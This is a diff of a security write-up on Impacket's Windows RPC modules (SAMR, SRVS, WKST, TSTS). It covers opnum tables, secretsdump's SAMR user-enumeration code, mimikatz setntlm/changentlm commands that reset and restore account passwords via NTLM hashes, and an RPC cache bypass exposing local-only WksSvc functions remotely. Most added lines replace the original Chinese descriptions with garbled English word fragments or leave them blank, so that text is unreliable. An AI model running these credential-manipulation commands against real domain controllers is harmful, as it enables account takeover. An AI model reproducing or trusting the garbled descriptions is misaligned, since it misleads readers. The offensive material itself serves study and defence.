 OPNUMS = {
- 0 : (SamrConnect, SamrConnectResponse),返回服务器对象的句柄
- 1 : (SamrCloseHandle, SamrCloseHandleResponse),关闭（即释放所使用的服务器端资源）从此 RPC 接口获得的任何上下文句柄
- 2 : (SamrSetSecurityObject, SamrSetSecurityObjectResponse),设置对服务器、域、用户、组或别名对象的访问控制
- 3 : (SamrQuerySecurityObject, SamrQuerySecurityObjectResponse),查询服务器、域、用户、组或别名对象的访问控制
- 5 : (SamrLookupDomainInSamServer, SamrLookupDomainInSamServerResponse),在给定对象名称的情况下获取域对象的SID
- 6 : (SamrEnumerateDomainsInSamServer, SamrEnumerateDomainsInSamServerResponse),获取由该协议的服务器端托管的所有域的列表
- 7 : (SamrOpenDomain, SamrOpenDomainResponse),在给定SID的情况下获取域对象的句柄
- 8 : (SamrQueryInformationDomain, SamrQueryInformationDomainResponse),从域对象获取属性
- 9 : (SamrSetInformationDomain, SamrSetInformationDomainResponse),更新域对象的属性
-10 : (SamrCreateGroupInDomain, SamrCreateGroupInDomainResponse),在域中创建一个组对象
-11 : (SamrEnumerateGroupsInDomain, SamrEnumerateGroupsInDomainResponse),枚举所有组
-12 : (SamrCreateUserInDomain, SamrCreateUserInDomainResponse),创建一个用户
-13 : (SamrEnumerateUsersInDomain, SamrEnumerateUsersInDomainResponse),枚举所有用户
-14 : (SamrCreateAliasInDomain, SamrCreateAliasInDomainResponse),创建别名
-15 : (SamrEnumerateAliasesInDomain, SamrEnumerateAliasesInDomainResponse),枚举所有别名
-16 : (SamrGetAliasMembership, SamrGetAliasMembershipResponse),获取给定SID集所属的所有别名的联合
-17 : (SamrLookupNamesInDomain, SamrLookupNamesInDomainResponse),将一组账户名转换为一组RID
-18 : (SamrLookupIdsInDomain, SamrLookupIdsInDomainResponse),将一组RID 转换为账户名
-19 : (SamrOpenGroup, SamrOpenGroupResponse),给定RID的情况下获取组的句柄
-20 : (SamrQueryInformationGroup, SamrQueryInformationGroupResponse),从组对象中获取属性
-21 : (SamrSetInformationGroup, SamrSetInformationGroupResponse),更新组对象的属性
-22 : (SamrAddMemberToGroup, SamrAddMemberToGroupResponse),将成员添加到组中
-23 : (SamrDeleteGroup, SamrDeleteGroupResponse),删除一个组对象
-24 : (SamrRemoveMemberFromGroup, SamrRemoveMemberFromGroupResponse),从组中移除成员
-25 : (SamrGetMembersInGroup, SamrGetMembersInGroupResponse),读取组的成员
-26 : (SamrSetMemberAttributesOfGroup, SamrSetMemberAttributesOfGroupResponse),设置成员关系的属性
-27 : (SamrOpenAlias, SamrOpenAliasResponse),给定RID的情况下获取别名的句柄
-28 : (SamrQueryInformationAlias, SamrQueryInformationAliasResponse),从别名对象获取属性
-29 : (SamrSetInformationAlias, SamrSetInformationAliasResponse),更新别名对象的属性
-30 : (SamrDeleteAlias, SamrDeleteAliasResponse),删除别名对象
-31 : (SamrAddMemberToAlias, SamrAddMemberToAliasResponse),将成员添加到别名
-32 : (SamrRemoveMemberFromAlias, SamrRemoveMemberFromAliasResponse),从别名中删除成员
-33 : (SamrGetMembersInAlias, SamrGetMembersInAliasResponse),获取别名的成员资格列表
-34 : (SamrOpenUser, SamrOpenUserResponse),给定RID的情况下获取用户句柄
-35 : (SamrDeleteUser, SamrDeleteUserResponse),删除用户对象
-36 : (SamrQueryInformationUser, SamrQueryInformationUserResponse),从用户对象获取属性
-37 : (SamrSetInformationUser, SamrSetInformationUserResponse),更新用户对象的属性
-38 : (SamrChangePasswordUser, SamrChangePasswordUserResponse),更改用户对象的密码
-39 : (SamrGetGroupsForUser, SamrGetGroupsForUserResponse),获取用户所属组的列表
-40 : (SamrQueryDisplayInformation, SamrQueryDisplayInformationResponse),从指定索引开始，按名称升序获取账户列表
-41 : (SamrGetDisplayEnumerationIndex, SamrGetDisplayEnumerationIndexResponse),获取按账户名升序排序的账户列表的索引
-44 : (SamrGetUserDomainPasswordInformation, SamrGetUserDomainPasswordInformationResponse),获取密码策略信息（不需要域句柄）
-45 : (SamrRemoveMemberFromForeignDomain, SamrRemoveMemberFromForeignDomainResponse),从所有别名中删除一个成员
-46 : (SamrQueryInformationDomain2, SamrQueryInformationDomain2Response),从域对象获取属性
-47 : (SamrQueryInformationUser2, SamrQueryInformationUser2Response),从用户对象获取属性
-48 : (SamrQueryDisplayInformation2, SamrQueryDisplayInformation2Response),从指定索引开始，按名称升序获取账户列表
-49 : (SamrGetDisplayEnumerationIndex2, SamrGetDisplayEnumerationIndex2Response),获取按账户名升序排序的账户列表的索引，这样索引就是账户名与客户端提供的字符串最匹配的账户列表中的位置。
-50 : (SamrCreateUser2InDomain, SamrCreateUser2InDomainResponse),创建一个用户
-51 : (SamrQueryDisplayInformation3, SamrQueryDisplayInformation3Response),从指定索引开始按名称升序获取账户列表
-52 : (SamrAddMultipleMembersToAlias, SamrAddMultipleMembersToAliasResponse),将多个成员添加到别名
-53 : (SamrRemoveMultipleMembersFromAlias, SamrRemoveMultipleMembersFromAliasResponse),从别名中删除多个成员
-54 : (SamrOemChangePasswordUser2, SamrOemChangePasswordUser2Response),更改用户的密码
-55 : (SamrUnicodeChangePasswordUser2, SamrUnicodeChangePasswordUser2Response),更改用户账户的密码
-56 : (SamrGetDomainPasswordInformation, SamrGetDomainPasswordInformationResponse),获取选择的密码策略信息（无需向服务器进行身份验证）
-57 : (SamrConnect2, SamrConnect2Response),返回服务器对象的句柄
-58 : (SamrSetInformationUser2, SamrSetInformationUser2Response),更新用户对象的属性
-62 : (SamrConnect4, SamrConnect4Response),获取服务器对象的句柄
-64 : (SamrConnect5, SamrConnect5Response),获取服务器对象的句柄
-65 : (SamrRidToSid, SamrRidToSidResponse),在给定RID的情况 下获取账户的SID
-66 : (SamrSetDSRMPassword, SamrSetDSRMPasswordResponse),设置本地恢复密码。
-67 : (SamrValidatePassword, SamrValidatePasswordResponse),根据本地存储的策略验证应用程序密码
+ 0 : (SamrConnect, SamrConnectResponse),returnsserverobjecthandle
+ 1 : (SamrCloseHandle, SamrCloseHandleResponse),closesreleasesserverthis RPC onhandle
+ 2 : (SamrSetSecurityObject, SamrSetSecurityObjectResponse),setsserverdomainusergrouporobject
+ 3 : (SamrQuerySecurityObject, SamrQuerySecurityObjectResponse),queriesserverdomainusergrouporobject
+ 5 : (SamrLookupDomainInSamServer, SamrLookupDomainInSamServerResponse),inobjectnameobtainsdomainobjectSID
+ 6 : (SamrEnumerateDomainsInSamServer, SamrEnumerateDomainsInSamServerResponse),obtainstheserveralldomainlist
+ 7 : (SamrOpenDomain, SamrOpenDomainResponse),inSIDobtainsdomainobjecthandle
+ 8 : (SamrQueryInformationDomain, SamrQueryInformationDomainResponse),
+ 9 : (SamrSetInformationDomain, SamrSetInformationDomainResponse),
+10 : (SamrCreateGroupInDomain, SamrCreateGroupInDomainResponse),indomaincreates agroupobject
+11 : (SamrEnumerateGroupsInDomain, SamrEnumerateGroupsInDomainResponse),enumeratesallgroup
+12 : (SamrCreateUserInDomain, SamrCreateUserInDomainResponse),creates auser
+13 : (SamrEnumerateUsersInDomain, SamrEnumerateUsersInDomainResponse),enumeratesalluser
+14 : (SamrCreateAliasInDomain, SamrCreateAliasInDomainResponse),
+15 : (SamrEnumerateAliasesInDomain, SamrEnumerateAliasesInDomainResponse),enumeratesall
+16 : (SamrGetAliasMembership, SamrGetAliasMembershipResponse),obtainsSIDall
+17 : (SamrLookupNamesInDomain, SamrLookupNamesInDomainResponse),
+18 : (SamrLookupIdsInDomain, SamrLookupIdsInDomainResponse),
+19 : (SamrOpenGroup, SamrOpenGroupResponse),
+20 : (SamrQueryInformationGroup, SamrQueryInformationGroupResponse),
+21 : (SamrSetInformationGroup, SamrSetInformationGroupResponse),
+22 : (SamrAddMemberToGroup, SamrAddMemberToGroupResponse),
+23 : (SamrDeleteGroup, SamrDeleteGroupResponse),deletes agroupobject
+24 : (SamrRemoveMemberFromGroup, SamrRemoveMemberFromGroupResponse),
+25 : (SamrGetMembersInGroup, SamrGetMembersInGroupResponse),
+26 : (SamrSetMemberAttributesOfGroup, SamrSetMemberAttributesOfGroupResponse),sets
+27 : (SamrOpenAlias, SamrOpenAliasResponse),
+28 : (SamrQueryInformationAlias, SamrQueryInformationAliasResponse),
+29 : (SamrSetInformationAlias, SamrSetInformationAliasResponse),
+30 : (SamrDeleteAlias, SamrDeleteAliasResponse),deletesobject
+31 : (SamrAddMemberToAlias, SamrAddMemberToAliasResponse),
+32 : (SamrRemoveMemberFromAlias, SamrRemoveMemberFromAliasResponse),
+33 : (SamrGetMembersInAlias, SamrGetMembersInAliasResponse),obtainslist
+34 : (SamrOpenUser, SamrOpenUserResponse),
+35 : (SamrDeleteUser, SamrDeleteUserResponse),deletesuserobject
+36 : (SamrQueryInformationUser, SamrQueryInformationUserResponse),
+37 : (SamrSetInformationUser, SamrSetInformationUserResponse),
+38 : (SamrChangePasswordUser, SamrChangePasswordUserResponse),
+39 : (SamrGetGroupsForUser, SamrGetGroupsForUserResponse),obtainsusergrouplist
+40 : (SamrQueryDisplayInformation, SamrQueryDisplayInformationResponse),
+41 : (SamrGetDisplayEnumerationIndex, SamrGetDisplayEnumerationIndexResponse),obtainslist
+44 : (SamrGetUserDomainPasswordInformation, SamrGetUserDomainPasswordInformationResponse),obtainspasswordpolicyinformationnotdomainhandle
+45 : (SamrRemoveMemberFromForeignDomain, SamrRemoveMemberFromForeignDomainResponse),
+46 : (SamrQueryInformationDomain2, SamrQueryInformationDomain2Response),
+47 : (SamrQueryInformationUser2, SamrQueryInformationUser2Response),
+48 : (SamrQueryDisplayInformation2, SamrQueryDisplayInformation2Response),
+49 : (SamrGetDisplayEnumerationIndex2, SamrGetDisplayEnumerationIndex2Response),obtainslistwithclientlist
+50 : (SamrCreateUser2InDomain, SamrCreateUser2InDomainResponse),creates auser
+51 : (SamrQueryDisplayInformation3, SamrQueryDisplayInformation3Response),
+52 : (SamrAddMultipleMembersToAlias, SamrAddMultipleMembersToAliasResponse),
+53 : (SamrRemoveMultipleMembersFromAlias, SamrRemoveMultipleMembersFromAliasResponse),
+54 : (SamrOemChangePasswordUser2, SamrOemChangePasswordUser2Response),
+55 : (SamrUnicodeChangePasswordUser2, SamrUnicodeChangePasswordUser2Response),
+56 : (SamrGetDomainPasswordInformation, SamrGetDomainPasswordInformationResponse),obtainspasswordpolicyinformationserver
+57 : (SamrConnect2, SamrConnect2Response),returnsserverobjecthandle
+58 : (SamrSetInformationUser2, SamrSetInformationUser2Response),
+62 : (SamrConnect4, SamrConnect4Response),obtainsserverobjecthandle
+64 : (SamrConnect5, SamrConnect5Response),obtainsserverobjecthandle
+65 : (SamrRidToSid, SamrRidToSidResponse),inRID obtainsSID
+66 : (SamrSetDSRMPassword, SamrSetDSRMPasswordResponse),setspassword
+67 : (SamrValidatePassword, SamrValidatePasswordResponse),
 }
 ```
 
 The interface is packed with user-oriented operations. A simple example: examples/secretsdump.py connects to the samr interface via hSamrConnect, queries the domain SID, opens a domain handle, then lists domain users via hSamrEnumerateUsersInDomain:
 
 ```python
- #  eg.examples/secretsdump.py
+# eg.examples/secretsdump.py
 
     def connectSamr(self, domain):
+        # handle chain: SAMR connect -> server handle -> domain SID lookup -> domain handle
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
         rpc.set_smb_connection(self.__smbConnection)
         self.__samr = rpc.get_dce_rpc()
         self.__samr.connect()
         self.__samr.bind(samr.MSRPC_UUID_SAMR)
-        resp = samr.hSamrConnect(self.__samr)
+        resp = samr.hSamrConnect(self.__samr)                        # (1) server handle
         serverHandle = resp['ServerHandle']
 
         resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
-        self.__domainSid = resp['DomainId'].formatCanonical()
+        self.__domainSid = resp['DomainId'].formatCanonical()        # (2) domain SID
 
         resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
-        self.__domainHandle = resp['DomainHandle']
+        self.__domainHandle = resp['DomainHandle']                    # (3) domain handle
         self.__domainName = domain
- 
- 
+  
+
  def getDomainUsers(self, enumerationContext=0):
         if self.__samr is None:
             self.connectSamr(self.getMachineNameAndDomain()[1])
 
+        # filter by account type (normal user / workstation / server / interdomain trust accounts)
         try:
-            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, 		self.__domainHandle,
+            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle,
                                                     userAccountControl=samr.USER_NORMAL_ACCOUNT | \
                                                                        samr.USER_WORKSTATION_TRUST_ACCOUNT | \
                                                                        samr.USER_SERVER_TRUST_ACCOUNT |\
                                                                        samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
                                                     enumerationContext=enumerationContext)
         except DCERPCException as e:
+            # STATUS_MORE_ENTRIES means another page follows; pull the current page from the exception packet and keep iterating
             if str(e).find('STATUS_MORE_ENTRIES') < 0:
                 raise
             resp = e.get_packet()
@@ -3095,17 +2710,17 @@ Because ChangeNTLM is heavily constrained by password policy (complexity, histor
 
 ```
 # SetNTLM
-# 修改密码
+# modifiespassword
 lsadump::setntlm /server:<DC's_IP_or_FQDN> /user:<username> /password:<new_password>
-# 还原密码
+# password
 lsadump::setntlm /server:<DC's_IP_or_FQDN> /user:<username> /ntlm:<Original_Hash>
 ```
 
 ```
 # ChangeNTLM
-# 修改密码
+# modifiespassword
 lsadump::changentlm /server:<DC's_IP_or_FQDN> /user:<username> /old:<current_hash> /newpassword:<newpassword>
-# 还原密码
+# password
 lsadump::changentlm /server:<DC's_IP_or_FQDN> /user:<username> /oldpassword:<current_password_plain_text> /new:<original_hash>
 ```
 
@@ -3127,7 +2742,7 @@ The addcomputer used by sam-the-admin likewise goes through samr's SamrCreateUse
 
 ```
 
-### [MS-SRVS]srvs.py
+### [MS-SRVS] srvs.py — Server Service (share / session management)
 
 The Server Service Remote Protocol remotely enables file and printer sharing over SMB, provides access to the server's [named pipes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_34f1dfa8-b1df-4d77-aa6e-d777422f9dca), and administers servers running Windows. Simply put, MS-SRVS provides remote file-server management over SMB named pipes (riding on MS-SMB2).
 
@@ -3135,53 +2750,53 @@ First let's see which interface methods the module implements:
 
 ```python
 OPNUMS = {
- 8 : (NetrConnectionEnum, NetrConnectionEnumResponse),列出了对服务器上 的共享资源进行的所有树连接或 从特定计算机建立的所有树连接
- 9 : (NetrFileEnum, NetrFileEnumResponse),根据指定的参数返回有关服务器上部分或所有打开文件的信息
-10 : (NetrFileGetInfo, NetrFileGetInfoResponse),检索有关特定开放服务器资源的信息
-11 : (NetrFileClose, NetrFileCloseResponse),服务器在 RPC_REQUEST 数据包中接收 NetrFileClose 方法。作为响应，服务器必须强制关闭服务器上打开的资源实例（例如，文件、设备或命名管道）
-12 : (NetrSessionEnum, NetrSessionEnumResponse),返回有关在服务器上建立的会话的信息
-13 : (NetrSessionDel, NetrSessionDelResponse),结束服务器和客户端之间的一个或多个网络会话
-14 : (NetrShareAdd, NetrShareAddResponse),共享服务器资源
-15 : (NetrShareEnum, NetrShareEnumResponse),检索有关服务器上每个共享资源的信息
-16 : (NetrShareGetInfo, NetrShareGetInfoResponse),从ShareList检索有关服务器上特定共享资源的信息
-17 : (NetrShareSetInfo, NetrShareSetInfoResponse),在 ShareList 中设置共享资源的参数
-18 : (NetrShareDel, NetrShareDelResponse),从 ShareList 中删除共享名称，这会断开与共享资源的所有连接。如果共享是粘性的，则有关该共享的所有信息也会从永久存储中删除
-19 : (NetrShareDelSticky, NetrShareDelStickyResponse),清除 ShareList 中 Share 的IsPersistent成员将共享标记为非持久
-20 : (NetrShareCheck, NetrShareCheckResponse),检查服务器是否正在共享设备
-21 : (NetrServerGetInfo, NetrServerGetInfoResponse),检索 CIFS 和 SMB 1.0 版服务器的当前配置信息
-22 : (NetrServerSetInfo, NetrServerSetInfoResponse),为 CIFS 和 SMB 1.0 版文件服务器设置服务器操作参数；它可以单独或共同设置它们。信息的存储方式使其在系统重新初始化后仍然有效
- 23 : (NetrServerDiskEnum, NetrServerDiskEnumResponse),检索服务器上的磁盘驱动器列表。该方法返回一个由三个字符组成的字符串数组（一个驱动器号、一个冒号和一个终止空字符）。
-24 : (NetrServerStatisticsGet, NetrServerStatisticsGetResponse),检索服务的操作统计信息
-25 : (NetrServerTransportAdd, NetrServerTransportAddResponse),将服务器绑定到传输协议
-26 : (NetrServerTransportEnum, NetrServerTransportEnumResponse),枚举有关服务器在TransportList中管理的传输协议的信息
-27 : (NetrServerTransportDel, NetrServerTransportDelResponse),从服务器解除绑定（或断开连接）传输协议。如果此方法成功，服务器将无法再使用指定的传输协议（如 TCP 或 XNS）与客户端通信。
-28 : (NetrRemoteTOD, NetrRemoteTODResponse),返回服务器上的时间信息
-30 : (NetprPathType, NetprPathTypeResponse),检查路径名以确定其类型
-31 : (NetprPathCanonicalize, NetprPathCanonicalizeResponse),将路径名转换为规范格式
-32 : (NetprPathCompare, NetprPathCompareResponse),执行两条路径的比较
-33 : (NetprNameValidate, NetprNameValidateResponse),执行检查以确保指定的名称是指定类型的有效名称
-34 : (NetprNameCanonicalize, NetprNameCanonicalizeResponse),将名称转换为指定类型的规范格式
-35 : (NetprNameCompare, NetprNameCompareResponse),对特定名称类型的两个名称进行比较
-36 : (NetrShareEnumSticky, NetrShareEnumStickyResponse),检索有关其 IsPersistent 设置在 ShareList 中设置的每个粘性共享资源的信息
-37 : (NetrShareDelStart, NetrShareDelStartResponse),执行两阶段共享删除的初始阶段
-38 : (NetrShareDelCommit, NetrShareDelCommitResponse),执行两阶段共享删除的最后阶段
-39 : (NetrpGetFileSecurity, NetrpGetFileSecurityResponse),向调用者返回保护文件或目录的安全描述符的副本
-40 : (NetrpSetFileSecurity, NetrpSetFileSecurityResponse),设置文件或目录的安全性
-41 : (NetrServerTransportAddEx, NetrServerTransportAddExResponse),将指定的服务器绑定到传输协议
-43 : (NetrDfsGetVersion, NetrDfsGetVersionResponse),检查服务器是否是DFS服务器，如果是则返回 DFS 版本
-44 : (NetrDfsCreateLocalPartition, NetrDfsCreateLocalPartitionResponse),将共享标记为DFS共享
-45 : (NetrDfsDeleteLocalPartition, NetrDfsDeleteLocalPartitionResponse),删除服务器上的DFS 共享
-46 : (NetrDfsSetLocalVolumeState, NetrDfsSetLocalVolumeStateResponse),将本地DFS 共享设置为联机或脱机。
-48 : (NetrDfsCreateExitPoint, NetrDfsCreateExitPointResponse),在服务器上创建一个DFS 链接
-49 : (NetrDfsDeleteExitPoint, NetrDfsDeleteExitPointResponse),删除服务器上的DFS 链接
-50 : (NetrDfsModifyPrefix, NetrDfsModifyPrefixResponse),更改对应于服务器上DFS链接的路径
-51 : (NetrDfsFixLocalVolume, NetrDfsFixLocalVolumeResponse),提供 服务器上新DFS 共享的信息
-52 : (NetrDfsManagerReportSiteInfo, NetrDfsManagerReportSiteInfoResponse),获取应该对应于指定服务器覆盖的 Active Directory站点
-53 : (NetrServerTransportDelEx, NetrServerTransportDelExResponse),服务器在 RPC_REQUEST 数据包中接收 NetrServerTransportDelEx 方法。作为响应，服务器从服务器解除绑定（或断开连接）传输协议。如果此方法成功，服务器将无法再 使用指定的传输协议（如 TCP 或 XNS）与客户端通信
-54 : (NetrServerAliasAdd, NetrServerAliasAddResponse),将别名附加到现有服务器名称并将别名对象插入AliasList中，通过它可以使用服务器名称或别名访问共享资源。别名用于根据每个树连接请求中显示的服务器名称来标识哪些资源对SMB客户端可见。
-55 : (NetrServerAliasEnum, NetrServerAliasEnumResponse),根据指定的别名或服务器名称检索服务器的别名信息
-56 : (NetrServerAliasDel, NetrServerAliasDelResponse),根据指定的别名从服务器别名列表中删除别名
-57 : (NetrShareDelEx, NetrShareDelExResponse),从ShareList中删除共享，这会断开与共享资源的所有连接。如果共享是粘性的，则有关该共享的所有信息也会从永久存储中删除。
+ 8 : (NetrConnectionEnum, NetrConnectionEnumResponse),
+ 9 : (NetrFileEnum, NetrFileEnumResponse),
+10 : (NetrFileGetInfo, NetrFileGetInfoResponse),retrievesserverinformation
+11 : (NetrFileClose, NetrFileCloseResponse),serverin RPC_REQUEST NetrFileClose methodasservermustclosesserveronopensor
+12 : (NetrSessionEnum, NetrSessionEnumResponse),returns information aboutinserveronsessioninformation
+13 : (NetrSessionDel, NetrSessionDelResponse),
+14 : (NetrShareAdd, NetrShareAddResponse),shareserver
+15 : (NetrShareEnum, NetrShareEnumResponse),retrievesserveronshareinformation
+16 : (NetrShareGetInfo, NetrShareGetInfoResponse),
+17 : (NetrShareSetInfo, NetrShareSetInfoResponse),in ShareList setsshare
+18 : (NetrShareDel, NetrShareDelResponse),
+19 : (NetrShareDelSticky, NetrShareDelStickyResponse),
+20 : (NetrShareCheck, NetrShareCheckResponse),
+21 : (NetrServerGetInfo, NetrServerGetInfoResponse),retrieves CIFS SMB 1.0 servercurrentinformation
+22 : (NetrServerSetInfo, NetrServerSetInfoResponse),as CIFS SMB 1.0 serversetsservercanorsetsinformationin
+ 23 : (NetrServerDiskEnum, NetrServerDiskEnumResponse),retrievesserverondriverlistthemethodreturns agroupgroupdriver
+24 : (NetrServerStatisticsGet, NetrServerStatisticsGetResponse),retrievesinformation
+25 : (NetrServerTransportAdd, NetrServerTransportAddResponse),
+26 : (NetrServerTransportEnum, NetrServerTransportEnumResponse),enumeratesserverinTransportListinformation
+27 : (NetrServerTransportDel, NetrServerTransportDelResponse),
+28 : (NetrRemoteTOD, NetrRemoteTODResponse),returnsserveroninformation
+30 : (NetprPathType, NetprPathTypeResponse),
+31 : (NetprPathCanonicalize, NetprPathCanonicalizeResponse),
+32 : (NetprPathCompare, NetprPathCompareResponse),
+33 : (NetprNameValidate, NetprNameValidateResponse),
+34 : (NetprNameCanonicalize, NetprNameCanonicalizeResponse),
+35 : (NetprNameCompare, NetprNameCompareResponse),
+36 : (NetrShareEnumSticky, NetrShareEnumStickyResponse),retrieves IsPersistent setsin ShareList setsshareinformation
+37 : (NetrShareDelStart, NetrShareDelStartResponse),
+38 : (NetrShareDelCommit, NetrShareDelCommitResponse),
+39 : (NetrpGetFileSecurity, NetrpGetFileSecurityResponse),
+40 : (NetrpSetFileSecurity, NetrpSetFileSecurityResponse),setsor
+41 : (NetrServerTransportAddEx, NetrServerTransportAddExResponse),
+43 : (NetrDfsGetVersion, NetrDfsGetVersionResponse),
+44 : (NetrDfsCreateLocalPartition, NetrDfsCreateLocalPartitionResponse),
+45 : (NetrDfsDeleteLocalPartition, NetrDfsDeleteLocalPartitionResponse),deletesserveronDFS share
+46 : (NetrDfsSetLocalVolumeState, NetrDfsSetLocalVolumeStateResponse),
+48 : (NetrDfsCreateExitPoint, NetrDfsCreateExitPointResponse),inserveroncreates aDFS
+49 : (NetrDfsDeleteExitPoint, NetrDfsDeleteExitPointResponse),deletesserveronDFS
+50 : (NetrDfsModifyPrefix, NetrDfsModifyPrefixResponse),
+51 : (NetrDfsFixLocalVolume, NetrDfsFixLocalVolumeResponse),
+52 : (NetrDfsManagerReportSiteInfo, NetrDfsManagerReportSiteInfoResponse),obtainsthespecifiedserver Active Directory
+53 : (NetrServerTransportDelEx, NetrServerTransportDelExResponse),serverin RPC_REQUEST NetrServerTransportDelEx methodasserverserverorifthismethodserver specified TCP or XNSwithclient
+54 : (NetrServerAliasAdd, NetrServerAliasAddResponse),
+55 : (NetrServerAliasEnum, NetrServerAliasEnumResponse),
+56 : (NetrServerAliasDel, NetrServerAliasDelResponse),
+57 : (NetrShareDelEx, NetrShareDelExResponse),
 }
 ```
 
@@ -3266,11 +2881,11 @@ In this specific case the attacker reaches the restricted opnums 58-74; one thin
 WksSvc exposes the [MS-WKST](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/5bb08058-bc36-4d3c-abeb-b132228281b7) interface. The service manages domain membership, computer names and connections to the [SMB network redirector](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/3acf0e02-9bbd-4ce0-a7a0-586bc72d3ef4#gt_15c89cb5-6767-49e7-b461-66acaf6c06c8), such as SMB print servers. Looking at the interface's security callback, several functions are treated differently: functions with opnums 8-11 are meant for local clients only — remote calls are not allowed. But thanks to the cache, an attacker first calls a different remotely-allowed function, then one of the restricted ones; the first call's cached result lets the "local-only" function be invoked remotely.
 
 ```
-当多个 RPC 服务器位于同一进程中时，该进程中的所有 RPC 接口都会暴露在该进程已注册的所有协议序列上。因此，如果一个组件只为 LRPC 调用实现，它不一定只能通过 LRPC 访问——它可以通过其他协议访问，因为进程中的其他 RPC 服务器可能正在侦听管道或套接字。
+ RPC servertheall RPC intheallonthisifgroupas LRPC not LRPC ——canas RPC serverinor
 
-与上下文句柄的情况类似，即使不在进程中注册另一个端点，也不意味着该进程不会暴露另一个端点。不管你如何注册你的服务器，你的接口和你的端点之间没有特殊的关联；所有接口都可以在该进程的所有端点上调用。这是端点安全模型无效的另一个原因；如果安全描述符被放置在端点上，攻击者可以调用另一个端点上的接口。
+withonhandlenotinnotthenotnotserverallcanintheallonifisinoncanon
 
-为确保仅在特定协议序列上调用进程，请注册安全回调函数，并在该函数中检查调用的协议序列。
+asinoninthe
 ```
 
 The exposed functions include *NetrUseAdd*, *NetrUseGetInfo*, *NetrUseDel* and *NetrUseEnum*. We can pass flags to *NetrUseAdd* telling it to create the mapping in the "global" drive namespace, affecting all users. The flags can be found in the header *LMUse.h*:
@@ -3287,73 +2902,73 @@ The RPC server under WksSvc itself performs no authentication registration. Runn
 
 PoC: https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2022-38034
 
-### [MS-TSTS]tsts.py
+### [MS-TSTS] tsts.py — Terminal Services Session Management
 
 The Terminal Services Terminal Server Runtime interface protocol — an RPC-based protocol for remotely querying and configuring aspects of a [terminal server](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/c41d3367-04c9-4c93-babf-9b5de834eb29#gt_b416f72e-cf04-4d80-bf93-f5753f3b0998).
 
 The module provides no opnum enumeration; combining the Windows manuals with the source, it implements both the client and server sides of the local session management server (\TermSrv):
 
 ```
-3.3.4.1.1 RpcOpenSession (Opnum 0)返回终端服务器 上指定会话的句柄。调用此方法不需要特殊权限
-3.3.4.1.2 RpcCloseSession (Opnum 1)关闭与终端服务器上指定会话的连接。此方法必须在RpcOpenSession之后调用。如果有多个线程在运行，则必须序列化对该方法的调用，否则该函数的行为是未知的。调用此方法不需要特殊权限。
-3.3.4.1.3 RpcConnect（Opnum 2）将 RpcOpenSession 返回的会话句柄 重新连接到终端服务器上的另一个指定会话
-3.3.4.1.4 RpcDisconnect (Opnum 3)断开终端服务器上的指定会话。
-3.3.4.1.5 RpcLogoff（Opnum 4）注销终端服务器上的指定会话
-3.3.4.1.6 RpcGetUserName (Opnum 5)获取登录到终端服务器 上指定会话的用户的用户名和域名
-3.3.4.1.7 RpcGetTerminalName (Opnum 6)获取与终端服务器上指定会话关联的终端的名称
-3.3.4.1.8 RpcGetState (Opnum 7)获取终端服务器上指定会话的状态
-3.3.4.1.9 RpcIsSessionDesktopLocked (Opnum 8)检查终端服务器上的指定会话是否处于锁定状态
-3.3.4.1.10 RpcShowMessageBox (Opnum 9)在终端服务器上运行的目标用户会话中显示一个带有指定消息和标题的消息框
-3.3.4.1.11 RpcGetTimes (Opnum 10)获取终端服务器上指定会话的连接、断开和登录时间
-3.3.4.1.12 RpcGetSessionCounters (Opnum 11)返回与终端服务器关联的各种性能计数器。调用此方法不需要特殊权限
-3.3.4.1.13 RpcGetSessionInformation（Opnum 12）检索有关在终端服务器上运行的指定会话的信息。呼叫者必须具有会话的 WINSTATION_QUERY 权限
-3.3.4.1.14 RpcGetLoggedOnCount (Opnum 15)获取用户连接和设备连接的会话数。调用此方法不需要特殊权限
-3.3.4.1.15 RpcGetSessionType (Opnum 16)获取与指定会话关联的类型。调用此方法不需要特殊权限
-3.3.4.1.16 RpcGetSessionInformationEx (Opnum 17)检索有关在终端服务器上运行的指定会话的扩展信息。呼叫者必须对会话具有 WINSTATION_QUERY 权限
+3.3.4.1.1 RpcOpenSession (Opnum 0)returnsserver onspecifiedsessionhandlethismethodnot
+3.3.4.1.2 RpcCloseSession (Opnum 1)closeswithserveronspecifiedsessionthismethodmustinRpcOpenSessionifinthenmustthemethodthentheasthismethodnot
+3.3.4.1.3 RpcConnectOpnum 2 RpcOpenSession returnssessionhandle serveronspecifiedsession
+3.3.4.1.4 RpcDisconnect (Opnum 3)serveronspecifiedsession
+3.3.4.1.5 RpcLogoffOpnum 4serveronspecifiedsession
+3.3.4.1.6 RpcGetUserName (Opnum 5)obtainsserver onspecifiedsessionuseruserrealm
+3.3.4.1.7 RpcGetTerminalName (Opnum 6)obtainswithserveronspecifiedsessionname
+3.3.4.1.8 RpcGetState (Opnum 7)obtainsserveronspecifiedsession
+3.3.4.1.9 RpcIsSessionDesktopLocked (Opnum 8)serveronspecifiedsession
+3.3.4.1.10 RpcShowMessageBox (Opnum 9)inserveronusersessionspecified
+3.3.4.1.11 RpcGetTimes (Opnum 10)obtainsserveronspecifiedsession
+3.3.4.1.12 RpcGetSessionCounters (Opnum 11)returnswithserverthismethodnot
+3.3.4.1.13 RpcGetSessionInformationOpnum 12retrievesinserveronspecifiedsessioninformationmustsession WINSTATION_QUERY
+3.3.4.1.14 RpcGetLoggedOnCount (Opnum 15)obtainsusersessionthismethodnot
+3.3.4.1.15 RpcGetSessionType (Opnum 16)obtainswithspecifiedsessionthismethodnot
+3.3.4.1.16 RpcGetSessionInformationEx (Opnum 17)retrievesinserveronspecifiedsessioninformationmustsession WINSTATION_QUERY
 .........
 ```
 
 The practical consumer is /examples/tstool.py:
 
 ```python
-# 终端服务操作工具。
-# qwinsta：显示有关远程桌面服务会话的信息。
